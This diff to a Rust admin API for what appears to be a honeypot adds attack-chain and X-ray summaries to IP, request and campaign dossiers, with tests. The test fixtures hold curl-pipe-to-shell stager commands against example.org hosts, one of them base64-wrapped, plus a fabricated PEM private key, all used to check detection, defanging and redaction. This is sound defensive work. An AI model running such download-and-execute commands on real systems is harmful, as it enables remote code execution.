@@ -11,8 +11,11 @@
 use crate::admin::AdminState;
 use crate::admin::api_v1::{rfc3339, summaries_json};
 use crate::admin::auth::SessionUser;
+use crate::admin::chains_json::{ChainJson, XraySummary, chains_json, xray_summary};
 use crate::admin::error::{AppError, AppResult};
+use crate::model::xray::{Policy, Source, parse};
 use crate::store::browse::{CalendarDay, canonical_ip};
+use crate::store::chains::Anchor;
 use crate::store::events::{Event, EventKind, EventPage};
 use crate::store::requests::IpRow;
 use crate::store::stats::Bucket;
@@ -122,6 +125,9 @@ pub struct Counts<T> {
     /// `canaries.reuses`.
     #[serde(skip_serializing_if = "Option::is_none")]
     pub reuses: Option<T>,
+    /// `chains`.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub chains: Option<T>,
 }
 
 /// The first `cap` of `v` (fetched with one more), and whether there were
@@ -349,6 +355,18 @@ fn campaign_ref(c: Option<(String, i64)>) -> Option<CampaignRef> {
 }
 
 /// The summaries of `addrs` as `/api/v1/ips` lists them.
+/// The chains of an anchor as JSON, at most [`CHAINS`]; true when there
+/// are more.
+async fn chains_of(store: &crate::store::Store, a: Anchor<'_>) -> Result<(Vec<ChainJson>, bool)> {
+    let mut found = store.chains_upto(a, CHAINS + 1).await?;
+    let more = found.len() > CHAINS;
+    found.truncate(CHAINS);
+    Ok((chains_json(store, &found).await?, more))
+}
+
+/// Chains a dossier lists.
+const CHAINS: usize = 32;
+
 async fn summaries_of(state: &AdminState, addrs: &[&str]) -> Result<Vec<Value>> {
     let read = crate::admin::lookup::bulk_read(state, addrs.iter().copied()).await?;
     Ok(summaries_json(state, &read.rows).await)
@@ -471,6 +489,8 @@ pub struct IpDossier {
     pub uploads: Vec<UploadJson>,
     pub commands: Vec<CommandJson>,
     pub canaries: IpCanaries,
+    /// Its attack chains, newest first, at most 32.
+    pub chains: Vec<ChainJson>,
 }
 
 /// One probe request and what each vantage answered. The vantage is named
@@ -655,6 +675,7 @@ pub async fn ip(state: &AdminState, addr: &str) -> Result<Option<Envelope<IpDoss
         },
     )
     .await?;
+    let (chains, chains_more) = chains_of(store, Anchor::Ip(ip.id)).await?;
     let body = IpDossier {
         detail,
         week: ov.week.iter().map(BucketJson::from).collect(),
@@ -681,6 +702,7 @@ pub async fn ip(state: &AdminState, addr: &str) -> Result<Option<Envelope<IpDoss
             used_from,
             reuses,
         },
+        chains,
     };
     Ok(Some(envelope(
         state,
@@ -692,6 +714,7 @@ pub async fn ip(state: &AdminState, addr: &str) -> Result<Option<Envelope<IpDoss
             uploads: Some(uploads_more),
             commands: Some(commands_more),
             reuses: Some(reuses_more),
+            chains: Some(chains_more),
             ..Default::default()
         },
         Counts::default(),
@@ -812,6 +835,12 @@ pub struct RequestDossier {
     /// The command it sent a dropped webshell, if it was answered as one.
     pub webshell_cmd: Option<String>,
     pub campaign: Option<CampaignRef>,
+    /// The newest chain it belongs to (its own pieces, if it joins none).
+    pub chain: Option<ChainJson>,
+    /// Chains past `chain`.
+    pub other_chains: i64,
+    /// What the X-ray found in its body: no layer text.
+    pub xray: XraySummary,
 }
 
 /// The request as recorded. `target`, `headers` and the body are
@@ -986,7 +1015,26 @@ pub async fn request(state: &AdminState, id: &str) -> Result<Option<Envelope<Req
         body_truncated: d.body_truncated,
         fingerprint: d.fingerprint,
     };
+    let mut chains = store.chains_of(Anchor::Request(id)).await?;
+    let other_chains = chains.len().saturating_sub(1) as i64;
+    chains.truncate(1);
+    let xray = xray_summary(&parse(
+        Source::Request {
+            method: &d.row.method,
+            path: &d.row.path,
+            query: d.row.query.as_deref(),
+            body: d.row.body.as_deref(),
+            sender: Some(&d.ip),
+        },
+        Policy::embedded(),
+    ));
     let body = RequestDossier {
+        chain: match chains.pop() {
+            Some(c) => chains_json(store, &[c]).await?.pop(),
+            None => None,
+        },
+        other_chains,
+        xray,
         request,
         ip,
         same_ip: same_ip.iter().map(RelatedJson::from).collect(),
@@ -1041,6 +1089,8 @@ pub struct CampaignDossier {
     pub events: Vec<EventJson>,
     /// A member carries an agent label.
     pub agent: bool,
+    /// The chains its members are in, newest first, at most 32.
+    pub chains: Vec<ChainJson>,
 }
 
 /// [`crate::store::campaigns::CampaignRow`], times in RFC 3339.
@@ -1194,6 +1244,7 @@ pub async fn campaign(state: &AdminState, key: &str) -> Result<Option<Envelope<C
     let (events, events_more) = events_json(&page);
     let (uploads, uploads_more) = uploads_json(store.campaign_uploads(&key, IPS_PLUS).await?);
     let (commands, commands_more) = capped(store.campaign_commands(&key, IPS_PLUS).await?, IPS);
+    let (chains, chains_more) = chains_of(store, Anchor::Campaign(&key)).await?;
     let body = CampaignDossier {
         shapes: store
             .campaign_shapes(&key)
@@ -1224,6 +1275,7 @@ pub async fn campaign(state: &AdminState, key: &str) -> Result<Option<Envelope<C
             .collect(),
         events,
         agent: !store.agent_campaigns(Some(&key)).await?.is_empty(),
+        chains,
         members: c.members.into_iter().map(MemberJson::from).collect(),
         edges,
         campaign: c.row.into(),
@@ -1240,6 +1292,7 @@ pub async fn campaign(state: &AdminState, key: &str) -> Result<Option<Envelope<C
             edges: Some(edges_more),
             uploads: Some(uploads_more),
             commands: Some(commands_more),
+            chains: Some(chains_more),
             ..Default::default()
         },
         Counts {
@@ -1325,7 +1378,8 @@ mod tests {
         assert_eq!(ip["campaign"]["key"], "192.0.2.3");
         assert_eq!(
             ip["truncated"],
-            json!({"events": false, "uploads": false, "commands": false, "reuses": false})
+            json!({"events": false, "uploads": false, "commands": false, "reuses": false,
+                "chains": false})
         );
         assert!(!ip["events"].as_array().unwrap().is_empty(), "{ip}");
         assert_eq!(ip["uploads"][0]["answered_path"], "/drop.php");
@@ -1357,7 +1411,7 @@ mod tests {
         assert_eq!(
             campaign["truncated"],
             json!({"events": false, "members": false, "edges": false,
-                "uploads": false, "commands": false})
+                "uploads": false, "commands": false, "chains": false})
         );
         assert!(campaign["events"][0]["ip"].is_string(), "{campaign}");
         assert_eq!(campaign["uploads"][0]["answered_path"], "/drop.php");
@@ -1604,6 +1658,311 @@ mod tests {
         assert!(campaign(&state, "nope").await.unwrap().is_none());
     }
 
+    const T0: &str = "2026-10-01 00:00:00";
+    const STAGER_URL: &str = "http://a.example.org:8080/x.sh";
+    /// A piece sighted in request `id` of address `ip_id`.
+    async fn sight(s: &crate::store::Store, id: i64, ip_id: i64, p: (&str, &str, &str)) {
+        let hash = crate::store::pieces::piece_hash(p.0, p.1);
+        sqlx::query(
+            "INSERT OR IGNORE INTO pieces (hash, kind, value, first_seen, last_seen, ips, sources)
+             VALUES (?, ?, ?, ?, ?, 1, 1)",
+        )
+        .bind(hash)
+        .bind(p.0)
+        .bind(p.1)
+        .bind(T0)
+        .bind(T0)
+        .execute(&s.pool)
+        .await
+        .unwrap();
+        sqlx::query("INSERT INTO piece_sightings VALUES (?, 'request', ?, ?, ?, 'seen', ?)")
+            .bind(hash)
+            .bind(id)
+            .bind(ip_id)
+            .bind(p.2)
+            .bind(T0)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+    }
+
+    /// The fixture's request, a stager and a key fingerprint sighted in it
+    /// and the chain pass run: (state, request id, dir).
+    async fn chained() -> (std::sync::Arc<AdminState>, i64, tempfile::TempDir) {
+        let (state, req, d) = seeded().await;
+        let s = &state.store;
+        let ip = s.ip_by_addr("192.0.2.1").await.unwrap().unwrap();
+        sight(s, req, ip.id, ("stager", "a.example.org", "stager")).await;
+        sight(s, req, ip.id, ("key", "SHA256:AAAA", "key")).await;
+        sqlx::query("INSERT INTO piece_urls VALUES (?, ?, ?, ?, 1)")
+            .bind(crate::store::pieces::piece_hash("stager", "a.example.org"))
+            .bind(STAGER_URL)
+            .bind(T0)
+            .bind(T0)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        sqlx::query("INSERT INTO piece_url_sources VALUES (?, ?, 'request', ?, ?)")
+            .bind(crate::store::pieces::piece_hash("stager", "a.example.org"))
+            .bind(STAGER_URL)
+            .bind(req)
+            .bind(T0)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        s.recompute_campaigns(true).await.unwrap();
+        (state, req, d)
+    }
+
+    /// Every string of `v`.
+    fn strings(v: &Value, out: &mut Vec<String>) {
+        match v {
+            Value::String(s) => out.push(s.clone()),
+            Value::Object(m) => m.values().for_each(|v| strings(v, out)),
+            Value::Array(a) => a.iter().for_each(|v| strings(v, out)),
+            _ => {}
+        }
+    }
+
+    fn rows(chain: &Value) -> Vec<&Value> {
+        chain["stages"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .flat_map(|s| s["rows"].as_array().unwrap())
+            .collect()
+    }
+
+    #[tokio::test]
+    async fn request_dossier_has_chain_and_xray_summary() {
+        let (state, req, _d) = chained().await;
+        let ip = state.store.ip_by_addr("192.0.2.1").await.unwrap().unwrap();
+        let body = b"curl -s http://example.org:8080/x.sh | sh";
+        let id = state
+            .store
+            .insert_request(&crate::store::requests::NewRequest {
+                ip_id: ip.id,
+                method: "POST".into(),
+                path: "/x".into(),
+                headers_json: "[]".into(),
+                labels_json: "[]".into(),
+                body: Some(body.to_vec()),
+                ..Default::default()
+            })
+            .await
+            .unwrap();
+        let d =
+            serde_json::to_value(request(&state, &id.to_string()).await.unwrap().unwrap()).unwrap();
+        assert_eq!(d["dossier_v"], 1);
+        let x = &d["xray"];
+        assert_eq!(
+            x["layers"][0],
+            json!({"kind": "raw", "parent": null, "depth": 0})
+        );
+        let stager = x["pieces"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .find(|p| p["kind"] == "stager")
+            .unwrap_or_else(|| panic!("{x}"));
+        assert_eq!(stager["value"], "example.org");
+        assert_eq!(stager["url"]["url"], "http://example.org:8080/x.sh");
+        assert_eq!(
+            stager["url"]["defanged"],
+            "hxxp://example[.]org:8080/x[.]sh"
+        );
+        assert!(x["opaque"].is_array());
+        // The first request carries the chain the pass built from it.
+        let d = request_dossier(&state, req).await;
+        let d = serde_json::to_value(d).unwrap();
+        let chain = &d["chain"];
+        assert_eq!(chain["more"], 0);
+        // The stager and the key each name a chain.
+        assert_eq!(d["other_chains"], 1);
+        let stager = rows(chain)
+            .into_iter()
+            .find(|r| r["kind"] == "stager")
+            .unwrap_or_else(|| panic!("{chain}"));
+        assert_eq!(stager["value"], "a.example.org");
+        assert_eq!(stager["defanged"], "a[.]example[.]org");
+        assert_eq!(
+            stager["urls"],
+            json!([{"url": STAGER_URL, "defanged": "hxxp://a[.]example[.]org:8080/x[.]sh"}])
+        );
+        assert_eq!(chain["stages"][0]["name"], "Exploit");
+        assert_eq!(chain["stages"].as_array().unwrap().len(), 5);
+        assert_eq!(chain["key"].as_str().unwrap().len(), 16);
+    }
+
+    #[tokio::test]
+    async fn a_stagers_urls_leave_out_those_only_queried() {
+        let (state, req, _d) = chained().await;
+        let s = &state.store;
+        let hash = crate::store::pieces::piece_hash("stager", "a.example.org");
+        let queried = "http://a.example.org:8080/only-queried";
+        // The same host, a second URL, named by a request that only queried it.
+        let ip = s.ip_by_addr("192.0.2.1").await.unwrap().unwrap();
+        let other = s
+            .insert_request(&crate::store::requests::NewRequest {
+                ip_id: ip.id,
+                method: "GET".into(),
+                path: "/q".into(),
+                headers_json: "[]".into(),
+                labels_json: "[]".into(),
+                ..Default::default()
+            })
+            .await
+            .unwrap();
+        sqlx::query("INSERT INTO piece_urls VALUES (?, ?, ?, ?, 1)")
+            .bind(hash)
+            .bind(queried)
+            .bind(T0)
+            .bind(T0)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        sqlx::query("INSERT INTO piece_url_sources VALUES (?, ?, 'request', ?, ?)")
+            .bind(hash)
+            .bind(queried)
+            .bind(other)
+            .bind(T0)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        sight(s, other, ip.id, ("stager", "a.example.org", "queried")).await;
+        let d = serde_json::to_value(request_dossier(&state, req).await).unwrap();
+        let stager = rows(&d["chain"])
+            .into_iter()
+            .find(|r| r["kind"] == "stager")
+            .unwrap();
+        let urls: Vec<_> = stager["urls"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .map(|u| u["url"].as_str().unwrap())
+            .collect();
+        assert_eq!(urls, [STAGER_URL]);
+    }
+
+    #[tokio::test]
+    async fn ip_dossier_lists_chains() {
+        let (state, _req, _d) = chained().await;
+        let d = serde_json::to_value(ip(&state, "192.0.2.1").await.unwrap().unwrap()).unwrap();
+        let chains = d["chains"].as_array().unwrap();
+        assert!(!chains.is_empty(), "{d}");
+        assert!(
+            chains
+                .iter()
+                .any(|c| rows(c).iter().any(|r| r["kind"] == "stager"))
+        );
+    }
+
+    #[tokio::test]
+    async fn campaign_dossier_lists_chains() {
+        let (state, _req, _d) = chained().await;
+        let d =
+            serde_json::to_value(campaign(&state, "192.0.2.3").await.unwrap().unwrap()).unwrap();
+        let chains = d["chains"].as_array().unwrap();
+        assert!(
+            chains
+                .iter()
+                .any(|c| rows(c).iter().any(|r| r["kind"] == "stager")),
+            "{d}"
+        );
+    }
+
+    #[tokio::test]
+    async fn dossier_v_stays_1() {
+        assert_eq!(DOSSIER_V, 1);
+        let (state, req, _d) = chained().await;
+        for d in all_four(&state, req).await {
+            assert_eq!(d["dossier_v"], 1);
+        }
+    }
+
+    #[tokio::test]
+    async fn xray_summary_holds_no_layer_text() {
+        let (state, _req, _d) = chained().await;
+        let ip = state.store.ip_by_addr("192.0.2.1").await.unwrap().unwrap();
+        // A layer's text: the body, and what base64 opens to.
+        let secret = "echo layer-text-marker-0451";
+        let body = format!(
+            "x={}",
+            data_encoding::BASE64
+                .encode(format!("{secret}; curl -s http://example.org/y | sh").as_bytes())
+        );
+        let id = state
+            .store
+            .insert_request(&crate::store::requests::NewRequest {
+                ip_id: ip.id,
+                method: "POST".into(),
+                path: "/x".into(),
+                headers_json: "[]".into(),
+                labels_json: "[]".into(),
+                body: Some(body.into_bytes()),
+                ..Default::default()
+            })
+            .await
+            .unwrap();
+        let d =
+            serde_json::to_value(request(&state, &id.to_string()).await.unwrap().unwrap()).unwrap();
+        let x = serde_json::to_string(&d["xray"]).unwrap();
+        assert!(x.contains("base64"), "{x}");
+        assert!(!x.contains("layer-text-marker-0451"), "{x}");
+        let mut names = vec![];
+        keys(&d["xray"], &mut names);
+        assert!(
+            !names.iter().any(|k| k == "text" || k == "body"),
+            "{names:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn key_material_is_not_in_the_chain_or_xray_fields() {
+        let (state, _req, _d) = chained().await;
+        let ip = state.store.ip_by_addr("192.0.2.1").await.unwrap().unwrap();
+        // Bytes generated for the test; the label makes it the PEM form.
+        let b64 = data_encoding::BASE64.encode(&(0..96u8).collect::<Vec<_>>());
+        let pem =
+            format!("-----BEGIN RSA PRIVATE KEY-----\n{b64}\n-----END RSA PRIVATE KEY-----\n");
+        let id = state
+            .store
+            .insert_request(&crate::store::requests::NewRequest {
+                ip_id: ip.id,
+                method: "POST".into(),
+                path: "/x".into(),
+                headers_json: "[]".into(),
+                labels_json: "[]".into(),
+                body: Some(pem.into_bytes()),
+                ..Default::default()
+            })
+            .await
+            .unwrap();
+        crate::store::pieces::extract(&state.store.pool)
+            .await
+            .unwrap();
+        state.store.recompute_campaigns(true).await.unwrap();
+        let d =
+            serde_json::to_value(request(&state, &id.to_string()).await.unwrap().unwrap()).unwrap();
+        let mut all = vec![];
+        strings(&d["xray"], &mut all);
+        strings(&d["chain"], &mut all);
+        let ip = serde_json::to_value(ip_dossier_of(&state).await).unwrap();
+        strings(&ip["chains"], &mut all);
+        let key = all
+            .iter()
+            .find(|s| s.starts_with("sha256-pem:"))
+            .unwrap_or_else(|| panic!("{all:?}"));
+        assert!(key.len() < 100);
+        for s in &all {
+            assert!(!s.contains(&b64[..40]) && !s.contains("PRIVATE KEY"), "{s}");
+        }
+    }
+
+    async fn ip_dossier_of(state: &AdminState) -> Envelope<IpDossier> {
+        ip(state, "192.0.2.1").await.unwrap().unwrap()
+    }
+
     /// `docs/openapi.json` declares what each kind serialises: every key
     /// declared, every required key present, nothing undeclared; one level
     /// into `limits`, `truncated` and `node`.
@@ -1621,7 +1980,7 @@ mod tests {
             }
         }
         let doc: Value = serde_json::from_str(crate::admin::api_v1::OPENAPI).unwrap();
-        let (state, request, _d) = seeded().await;
+        let (state, request, _d) = chained().await;
         for d in all_four(&state, request).await {
             let name = match d["kind"].as_str().unwrap() {
                 "ip" => "IpDossier",
@@ -1638,6 +1997,28 @@ mod tests {
                     &d[nested],
                     &format!("{name}.{nested}"),
                 );
+            }
+            // The chain and X-ray objects, one level in.
+            let schemas = &doc["components"]["schemas"];
+            let chains = match name {
+                "RequestDossier" => {
+                    check(&schemas["XraySummary"], &d["xray"], "xray");
+                    vec![d["chain"].clone()]
+                }
+                "IpDossier" | "CampaignDossier" => d["chains"].as_array().unwrap().clone(),
+                _ => vec![],
+            };
+            if name != "AsnDossier" {
+                assert!(!chains.is_empty() && !chains[0].is_null(), "{name}: {d}");
+            }
+            for c in &chains {
+                check(&schemas["Chain"], c, "chain");
+                for stage in c["stages"].as_array().unwrap() {
+                    check(&schemas["ChainStage"], stage, "stage");
+                    for row in stage["rows"].as_array().unwrap() {
+                        check(&schemas["ChainRowItem"], row, "row");
+                    }
+                }
             }
         }
     }
